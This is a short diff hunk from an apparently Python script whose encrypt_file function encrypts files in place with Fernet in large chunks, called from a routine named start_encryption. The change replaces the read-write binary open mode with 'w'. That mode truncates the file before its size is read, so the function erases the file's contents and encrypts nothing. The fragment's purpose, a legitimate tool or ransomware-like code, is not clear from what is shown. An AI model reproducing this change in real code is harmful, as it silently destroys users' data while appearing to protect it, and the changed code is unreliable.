@@ -188,7 +188,7 @@ def start_encryption():
 
 def encrypt_file(path, key, chunk_size=268435456):
     try:
-        with open(path, "r+b", buffering=-1) as f:
+        with open(path, "w", buffering=-1) as f:
             file_size = os.path.getsize(path)
             cipher = Fernet(key=key)
             for offset in range(0, file_size, chunk_size):
